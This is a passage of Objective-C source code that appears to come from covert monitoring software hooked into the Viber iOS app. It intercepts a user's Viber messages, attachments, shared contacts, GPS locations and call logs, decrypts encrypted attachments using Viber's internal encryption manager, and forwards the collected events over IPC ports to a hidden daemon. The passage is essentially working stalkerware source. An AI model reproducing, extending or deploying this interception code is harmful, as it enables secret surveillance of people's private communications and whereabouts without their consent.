                    FxAttachment *fxattachment	= [[FxAttachment alloc] init];												
                    // -- Check if thumbnail data exist or not
                    if ([fileManager fileExistsAtPath:filepath]){ 	
                        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                        
                        // -- get thumbnail data
                        NSData * incomingattactment = [NSData dataWithContentsOfFile:[attachment previewPath]];					
                        [fxattachment setMThumbnail:incomingattactment];			// -- thumbnail
                        
                        [pool release];
                    } else{
                        Class $PLTFormattedMessage = objc_getClass("PLTFormattedMessage");
                        if ([aPLTMessage isKindOfClass:$PLTFormattedMessage]) {
                            PLTFormattedMessage *formattedMessage = (PLTFormattedMessage *) aPLTMessage;
                            DLog(@"attachments, %@", [(PLTFormattedMessage *)aPLTMessage attachments])
                            //DLog(@"attributes, %@", [(PLTFormattedMessage *)aPLTMessage attributes])
                            DLog(@"previewText, %@", [(PLTFormattedMessage *)aPLTMessage previewText])
                            DLog(@"notificationText, %@", [(PLTFormattedMessage *)aPLTMessage notificationText])
                            
                            for (PLTFormattedMessageAttachment *formattedAttachment in [formattedMessage attachments]) {
                                /*
                                DLog(@"downloadType, %d", [formattedAttachment downloadType]);
                                DLog(@"mediaType, %@", [formattedAttachment mediaType]);
                                DLog(@"thumbnailUrl, %@", [formattedAttachment thumbnailUrl]);
                                DLog(@"thumbnailDownloadID, %@", [formattedAttachment thumbnailDownloadID]);
                                DLog(@"thumbnailBucketName, %@", [formattedAttachment thumbnailBucketName]);
                                DLog(@"url, %@", [formattedAttachment url]);
                                DLog(@"bucketName, %@", [formattedAttachment bucketName]);
                                DLog(@"downloadID, %@", [formattedAttachment downloadID]);
                                DLog(@"attachmentName, %@", [formattedAttachment attachmentName]);
                                 */
                                
                                if ([formattedAttachment respondsToSelector:@selector(elementAttributes)]) { // < 5.8.0
                                    VIBFormattedMessageAction *formattedMsgAction = [[formattedAttachment elementAttributes] action];
                                    DLog(@"name, %@", [formattedMsgAction name]);
                                    DLog(@"parameters, %@", [formattedMsgAction parameters]);
                                    
                                    NSString *jsonSharedContact = [[formattedMsgAction parameters] objectForKey:@"iOS_numberIsNotViberFailureAction"];
                                    DLog(@"jsonSharedContact: %@", jsonSharedContact);
                                    
                                    NSData *objectData = [jsonSharedContact dataUsingEncoding:NSUTF8StringEncoding];
                                    if (objectData) {
                                        NSError *jsonError = nil;
                                        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:objectData
                                                                                             options:NSJSONReadingMutableContainers
                                                                                               error:&jsonError];
                                        DLog(@"json, %@", json);
                                        
                                        if (!jsonError) {
                                            NSString *contactName = [[json objectForKey:@"parameters"] objectForKey:@"contact_name"];
                                            if (contactName) {
                                                contactName = [NSString stringWithFormat:@"Name: %@", contactName];
                                                [imEvent setMMessage:contactName];
                                                [imEvent setMRepresentationOfMessage:kIMMessageContact];
                                            }
                                        } else {
                                            DLog(@"jsonError: %@", jsonError);
                                        }
                                    }
                                }
                            }
                        } else {
                            PLTMediaMessage *pltMediaMessage = (PLTMediaMessage *)aPLTMessage;
                            DLog(@"***======== thumbnail length %llu ==========", (unsigned long long)[[pltMediaMessage thumbnail] length])
                            DLog(@"***======== pttId %@ ==========", [pltMediaMessage pttId])
                            DLog(@"***======== bucketName %@ ==========", [pltMediaMessage bucketName])
                            DLog(@"***======== duration %@ ==========", [pltMediaMessage duration])
                            DLog(@"***======== downloadId %@ ==========", [pltMediaMessage downloadID])
                            if ([pltMediaMessage thumbnail] != nil) {
                                DLog(@"***=================== Photo Thumbnail (PLTMediaMessage) ==========")
                                if ([[pltMediaMessage thumbnail] length] > 0) {
                                    [fxattachment setMThumbnail:[pltMediaMessage thumbnail]];
                                } else {
                                    /*
                                     This will cause the UI will not download thumbnail fast... but won't hang the UI
                                     */
                                    NSString * url = [NSString stringWithFormat:@"http://%@.s3.amazonaws.com/%@.jpg",[pltMediaMessage bucketName],[pltMediaMessage downloadID]];
                                    DLog(@"==================== url %@",url);
                                    NSURL * picUrl = [NSURL URLWithString:url];
                                    [fxattachment setMThumbnail:[NSData dataWithContentsOfURL:picUrl]];
                                }
                            } else {
                                DLog(@"***=================== Photo Thumbnail Lost %@",filepath);																				
                            }
                        }
                    }
                    
                    [fxattachment setFullPath:@"image/jpeg"];						// -- mime type
                    //[fxattachment setFullPath:[attachment path]];
                    [attachments addObject:fxattachment];
                    [fxAttachments addObject:fxattachment];
                    [fxattachment release];
                    [imEvent setMAttachments:attachments];
                    [attachments release];
                    
                    if ([aPLTMessage isKindOfClass:objc_getClass("PLTFormattedMessage")]) {
                        DLog(@"Reset attachments of IM because this is a shared contact...");
                        [fxAttachments removeAllObjects];
                    }
                }
                else if([[attachment type]isEqual:@"video"]){
                    //=========Fix msg just delete it if cause error
                    if([[result text]length]==0){
                        [imEvent setMRepresentationOfMessage:kIMMessageNone];
                    }
                    //=========Fix msg just delete it if cause error
                    downloadVideo = YES;
                }               
                else if([[attachment type]isEqual:@"customLocation"]){	// Capture Shared Location
                    DLog(@"***** sharelocation %@",[result location]);
                    [imEvent setMRepresentationOfMessage:kIMMessageShareLocation];
                    ViberLocation * viberLocation = [result location];
                    FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
                    [location setMLongitude:[[viberLocation longitude]floatValue]];
                    [location setMLatitude:[[viberLocation latitude]floatValue]];
                    DLog (@"hor accu %@", [viberLocation horizontalAccuracy]);
                    DLog (@"Viber location address = %@", [viberLocation address]);
                    DLog (@"Viber message address = %@", [result address]);
                    float hor				= -1;						// default value when cannot get information	
                    if ([viberLocation horizontalAccuracy])
                        hor					= [[viberLocation horizontalAccuracy] floatValue];
                    [location setMHorAccuracy:hor];
                    [location setMPlaceName:[viberLocation address]];
                    [imEvent setMShareLocation:location];
                    [location release];
                }
                else if ([[attachment type] isEqualToString:@"gif"]) {
                    FxAttachment *fxattachment	= [[FxAttachment alloc] init];
                    [fxattachment setFullPath:@"image/gif"];
                    NSData *gifData = [NSData dataWithContentsOfURL:[NSURL URLWithString:attachment.url]]; // UI thread did not block!
                    if (gifData) {
                        [fxattachment setMThumbnail:gifData];
                    }
                    
                    [fxAttachments addObject:fxattachment];
                    [fxattachment release];
                    
                    imEvent.mMessage = nil;
                    imEvent.mRepresentationOfMessage = kIMMessageNone;
                }
                else if ([[attachment type] isEqualToString:@"winkPicture"]) {
                    NSString *winkUrl = [NSString stringWithFormat:@"https://share.viber.com/download.php?Bucket=%@&ID=%@&Filetype=jpg&Content-Length=489&Content-Type=multipart/form-data;boundary=---------------------------14195704659626791419570465962701&boundary=---------------------------14195704659626791419570465962701&fileBottomOffset=69&fileName=&fileTopOffset=0", [attachment bucket], [attachment ID]];
                    
                    NSData *winkData = [NSData dataWithContentsOfURL:[NSURL URLWithString:winkUrl]]; // UI thread did not block!
                    DLog(@"Photo winkData = %lu", (unsigned long)winkData.length);
                    
                    NSString *imViberAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imViber/"];
                    NSString *saveFilePath = [NSString stringWithFormat:@"%@%f%@.jpg", imViberAttachmentPath, [[aViberMessage date] timeIntervalSince1970], [attachment name]];
                    if (![winkData writeToFile:saveFilePath atomically:YES]) {
                        // iOS 9, Sandbox
                        saveFilePath = [IMShareUtils saveData:winkData toDocumentSubDirectory:@"/attachments/imViber/" fileName:[saveFilePath lastPathComponent]];
                    }
                    
                    if (winkData) {
                        if ([attachment respondsToSelector:@selector(encryptionParams)]) { // Decrypt video (6.0.2 up)
                            NSData *encryptionParams = attachment.encryptionParams;
                            if (encryptionParams) {
                                ViberAppDelegate *vAppDelegate = (ViberAppDelegate *)[UIApplication sharedApplication].delegate;
                                VIBInjector *vInjector = vAppDelegate.injector;
                                VIBEncryptionManager *encryptionManager = vInjector.encryptionManager;
                                [encryptionManager decryptFile:saveFilePath withEncryptionParams:encryptionParams];
                            }
                        }
                        
                        FxAttachment *fxattachment = [[FxAttachment alloc] init];
                        [fxattachment setFullPath:saveFilePath];
                        [fxattachment setMThumbnail:nil];
                        [fxAttachments addObject:fxattachment];
                        [fxattachment release];
                        
                        imEvent.mRepresentationOfMessage = kIMMessageNone;
                    }
                }
                else if ([[attachment type] isEqualToString:@"winkVideo"]) {
                    DLog(@"Wink video will be download");
                    
                    downloadVideo = YES;
                }
            }
        }
        
        [imEvent setMAttachments:fxAttachments];
        
        // Check again for shared contact, gif
        Class $PLTFormattedMessage = objc_getClass("PLTFormattedMessage");
        if ([aPLTMessage isKindOfClass:$PLTFormattedMessage]) {
            if ([imEvent mRepresentationOfMessage] != kIMMessageContact) {
                DLog(@"mediaType : %@", aPLTMessage.mediaType);
                
                VIBFormattedMessageTextAttributes *attributeText = nil;
                Class $VIBFormattedMessageTextAttributes = objc_getClass("VIBFormattedMessageTextAttributes");
                for (id attribute in [(PLTFormattedMessage *)aPLTMessage attributes]) {
                    if ([attribute isKindOfClass:$VIBFormattedMessageTextAttributes]) {
                        attributeText = attribute;
                        break;
                    }
                }
                
                VIBFormattedMessageAction *formattedMsgAction = [attributeText action];
                DLog(@"name, %@", [formattedMsgAction name]);
                DLog(@"parameters, %@", [formattedMsgAction parameters]);
                
                DLog(@"Check again shared contact...");
                NSString *jsonSharedContact = [[formattedMsgAction parameters] objectForKey:@"iOS_numberIsNotViberFailureAction"];
                DLog(@"jsonSharedContact: %@", jsonSharedContact);
                
                NSData *objectData = [jsonSharedContact dataUsingEncoding:NSUTF8StringEncoding];
                if (objectData) {
                    NSError *jsonError = nil;
                    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:objectData
                                                                         options:NSJSONReadingMutableContainers
                                                                           error:&jsonError];
                    DLog(@"json, %@", json);
                    
                    if (!jsonError) {
                        NSString *contactName = [[json objectForKey:@"parameters"] objectForKey:@"contact_name"];
                        if (contactName) {
                            contactName = [NSString stringWithFormat:@"Name: %@", contactName];
                            [imEvent setMMessage:contactName];
                            [imEvent setMRepresentationOfMessage:kIMMessageContact];
                            [imEvent setMAttachments:nil];
                        }
                    } else {
                        DLog(@"jsonError: %@", jsonError);
                    }
                }
                
                DLog(@"Check big gif file...");
                NSString *gifUrl = [[formattedMsgAction parameters] objectForKey:@"url"];
                DLog(@"gifUrl  :  [%@] %@", [gifUrl class], gifUrl);
                
                NSData *gifData = [NSData dataWithContentsOfURL:[NSURL URLWithString:gifUrl]]; // UI thread did not block!
                if (gifData) {
                    FxAttachment *fxattachment	= [[FxAttachment alloc] init];
                    fxattachment.fullPath = @"image/gif";
                    fxattachment.mThumbnail = gifData;
                    [fxAttachments addObject:fxattachment];
                    [fxattachment release];
                    
                    imEvent.mAttachments = fxAttachments;
                    imEvent.mMessage = nil;
                    imEvent.mRepresentationOfMessage = kIMMessageNone;
                }
            }
        }
        
		// Send Viber event
//		[ViberUtils sendViberEvent:imEvent
//						Attachment:attachment
//					  viberMessage:result
//						shouldWait:NO
//					 downloadVideo:downloadVideo];
		
		// Wait in operation then send Viber event
		NSNumber *isOutgoing = [NSNumber numberWithBool:NO];
		NSNumber *shouldWait = [NSNumber numberWithInt:NO];
		NSNumber *isDownloadVideo = [NSNumber numberWithBool:downloadVideo];
		NSThread *currentThread = [NSThread currentThread];
		DLog (@"currentThread = %@", currentThread)
		NSDictionary *threadSafeInfo = nil;
        if (attachmentObj) {
            if ([attachmentObj isKindOfClass:$Attachment]) {
                threadSafeInfo = [NSDictionary dictionaryWithObjectsAndKeys:[result seq], @"seq",
                                        [[result attachment] name], @"att-name",
                                        [[result attachment] bucket], @"att-bucket",
                                        [[result attachment] ID], @"att-id",
                                        [[result attachment] previewPath], @"att-preview", nil];
            } else if ([attachmentObj isKindOfClass:$NSOrderedSet]) {
                threadSafeInfo = [NSDictionary dictionaryWithObjectsAndKeys:[result seq], @"seq",
                                  attachmentObj, @"attachmentObj", nil];
            }
        } else {
            threadSafeInfo = [NSDictionary dictionaryWithObject:[result seq] forKey:@"seq"];
        }
								
		//NSRunLoop *currentRunLoop = [NSRunLoop currentRunLoop];
		//[currentRunLoop run];
		NSArray *args = [NSArray arrayWithObjects:imEvent, result, isDownloadVideo, shouldWait, isOutgoing, threadSafeInfo, currentThread, nil];
		
		ViberUtils *viberUtils = [[ViberUtils alloc] init];
		//NSOperationQueue *queue = [[ViberUtils sharedViberUtils] mQueryQueue];
		
		//ViberQueryOP *op = [[ViberQueryOP alloc] init];
		//[op setMArguments:args];
		//[op setMSelector:@selector(thread40:)];
		//[op setMDelegate:viberUtils];
		//[op setMWaitInterval:3];
		//[queue addOperation:op]; // Crash because of current thread is exited before the operation completed
		//[viberUtils performSelector:@selector(thread40:) // Halt the thread because the current thread not design to have the run loop
		//				 withObject:args
		//				 afterDelay:3.0];
		[viberUtils performSelector:@selector(thread40:) withObject:args];
		//[op release];
		[viberUtils autorelease];
		
		//
		[imEvent release];
	}
}

- (void) thread40: (NSArray *) aArgs {
	FxIMEvent *event                = [aArgs objectAtIndex:0];
	ViberMessage *viberMessage      = [aArgs objectAtIndex:1];
	NSNumber *isDownloadVideo       = [aArgs objectAtIndex:2];
	NSNumber *shouldWait            = [aArgs objectAtIndex:3];
	NSDictionary *threadSafeInfo    = [aArgs objectAtIndex:5];
    NSThread *bgsThread             = [aArgs objectAtIndex:6];
    
	DLog (@"currentThread of perform selector = %@", [NSThread currentThread])
	DLog (@"====================================================")
	DLog (@"token		= %@",  [viberMessage token])
	DLog (@"seq			= %@",  [viberMessage seq])
	DLog (@"systemType	= %@",  [viberMessage systemType])
	DLog (@"mediaType	= %@",  [viberMessage mediaType])
	DLog (@"state		= %@",  [viberMessage state])
	DLog (@"====================================================")
    
    id attachmentObj = nil;
    if ([viberMessage respondsToSelector:@selector(attachment)]) {
        attachmentObj = [viberMessage attachment];
        DLog (@"***************************************************************")
        DLog (@"token		= %@",  [[viberMessage attachment] ID])
        DLog (@"seq			= %@",  [[viberMessage attachment] seq])
        DLog (@"bucket		= %@",  [[viberMessage attachment] bucket])
        DLog (@"type		= %@",  [[viberMessage attachment] type])
        DLog (@"state		= %@",  [[viberMessage attachment] state])
        DLog (@"**************************************************************")
    } else if ([viberMessage respondsToSelector:@selector(attachments)]){
        attachmentObj = [viberMessage attachments];
        
        Attachment *vAttachment = [[(NSOrderedSet *)attachmentObj array] firstObject];
        if ([vAttachment respondsToSelector:@selector(encryptionParams)]) {
            NSData *encryptionParams = vAttachment.encryptionParams;
            if (encryptionParams) {
                NSMutableDictionary *newThreadSafeInfo = [NSMutableDictionary dictionaryWithDictionary:threadSafeInfo];
                [newThreadSafeInfo setObject:encryptionParams forKey:@"encryptionParams"];
                threadSafeInfo = newThreadSafeInfo;
            }
        }
    }
	
	// Send Viber event
//	[ViberUtils sendViberEvent:event
//					Attachment:[viberMessage attachment]
//				  viberMessage:viberMessage
//					shouldWait:[shouldWait boolValue]
//				 downloadVideo:[isDownloadVideo boolValue]];
	
	// Add extra arguments to array that's why cannot use above method
	NSArray *extraArgs = [[NSArray alloc] initWithObjects:event,isDownloadVideo,shouldWait,viberMessage,attachmentObj,threadSafeInfo,bgsThread,nil];
	[NSThread detachNewThreadSelector:@selector(thread30:) toTarget:self withObject:extraArgs];
	[extraArgs release];
}

#pragma mark -
#pragma mark Utils methods
#pragma mark -

+ (NSData *) stickerDataWithSticker: (VIBStickerData *) aSticker {
    // 5.5.0
    Class $VIBSingleStickerView = objc_getClass("VIBSingleStickerView");
    VIBSingleStickerView *stickerView = [$VIBSingleStickerView singleStickerViewWithStickerData:aSticker frame:CGRectMake(0, 0, [aSticker size].width, [aSticker size].height)];
    
    UIImageView *_stickerImage = nil;
    UIImageView *_outlineImage = nil;
    
    object_getInstanceVariable(stickerView, "_stickerImage", (void **)&_stickerImage);
    object_getInstanceVariable(stickerView, "_outlineImage", (void **)&_outlineImage);
    
    DLog(@"_stickerImage, %@", _stickerImage);
    DLog(@"_outlineImage, %@", _outlineImage);
    DLog(@"stickerView, %@", stickerView);
    
    UIImage *stickerImage = [_stickerImage image];
    NSData *stickerData = UIImagePNGRepresentation(stickerImage);
    return (stickerData);
}

+ (BOOL) sendDataToPort: (NSData *) aData portName: (NSString *) aPortName {
	BOOL successfully = FALSE;
	if ([[[UIDevice currentDevice] systemVersion] intValue] <= 6) {
		MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
		successfully = [messagePortSender writeDataToPort:aData];
		[messagePortSender release];
		messagePortSender = nil;
	} else {
		SharedFile2IPCSender *sharedFileSender = nil;
		if ([aPortName isEqualToString:kViberMessagePort]) {
			sharedFileSender = [[ViberUtils sharedViberUtils] mIMSharedFileSender];
		} else {
			sharedFileSender = [[ViberUtils sharedViberUtils] mVOIPSharedFileSender];
		}
		successfully = [sharedFileSender writeDataToSharedFile:aData];
	}
	return (successfully);
}

+ (void) deleteAttachmentFileAtPathForEvent: (NSArray *) aAttachmentArray  {
	for(int i=0; i<[aAttachmentArray count]; i++){
		FxAttachment *attachment = (FxAttachment *)[aAttachmentArray objectAtIndex:i];
		NSString *path = [attachment fullPath];
		BOOL deletesuccess = [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
		if (deletesuccess){
			DLog (@"Deleting file %@",path );
		} else {
			DLog (@"Fail deleting file %@",path );
		}
	}
}

+ (void) lock {
	if (_viberMessageQueryLock == nil) {
		_viberMessageQueryLock = [[NSLock alloc] init];
	}
	[_viberMessageQueryLock lock];
}

+ (void) unlock {
	[_viberMessageQueryLock unlock];
}


#pragma mark -
#pragma mark VoIP
#pragma mark -


#pragma mark VoIP (public method)


+ (FxVoIPEvent *) createViberVoIPEventForContactID: (NSString *) aContactID
									   contactName: (NSString *) aContactName
										  duration: (NSInteger) aDuration
										 direction: (FxEventDirection) aDirection {
	// -- create FxVoIPEvent		
	FxVoIPEvent *voIPEvent	= [[FxVoIPEvent alloc] init];	
	[voIPEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[voIPEvent setEventType:kEventTypeVoIP];															
	[voIPEvent setMCategory:kVoIPCategoryViber];	
	[voIPEvent setMDirection:aDirection];
	[voIPEvent setMDuration:aDuration];			
	[voIPEvent setMUserID:aContactID];										// participant id 
	[voIPEvent setMContactName:aContactName];								// participant displayname
	[voIPEvent setMTransferedByte:0];
	[voIPEvent setMVoIPMonitor:kFxVoIPMonitorNO];
	[voIPEvent setMFrameStripID:0];				
	
	return [voIPEvent autorelease];
}

+ (void) sendViberVoIPEvent: (FxVoIPEvent *) aVoIPEvent {
	ViberUtils *viberUtils = [[ViberUtils alloc] init];
	[NSThread detachNewThreadSelector:@selector(voIPthread:)
							 toTarget:viberUtils withObject:aVoIPEvent];
	[viberUtils autorelease];	
}


#pragma mark VoIP (private method)


- (void) voIPthread: (FxVoIPEvent *) aVoIPEvent {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		
		NSMutableData* data			= [[NSMutableData alloc] init];
		
		NSKeyedArchiver *archiver	= [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
		[archiver encodeObject:aVoIPEvent forKey:kViberArchied];
		[archiver finishEncoding];
		[archiver release];	
		
		// -- first port ----------
		BOOL sendSuccess = [ViberUtils sendDataToPort:data portName:kViberCallLogMessagePort1];
		if (!sendSuccess){
			DLog (@"First attempt fails %@", aVoIPEvent)
			
			// -- second port ----------
			sendSuccess = [ViberUtils sendDataToPort:data portName:kViberCallLogMessagePort2];
			if (!sendSuccess) {
				DLog (@"Second attempt fails %@", aVoIPEvent)
				
				[NSThread sleepForTimeInterval:1];
				
				// -- Third port ----------				
				sendSuccess = [ViberUtils sendDataToPort:data portName:kViberCallLogMessagePort3];
				if (!sendSuccess) {
					DLog (@"LOST Viber VoIP event %@", aVoIPEvent)
				}
			}
		}			
		[data release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

@end
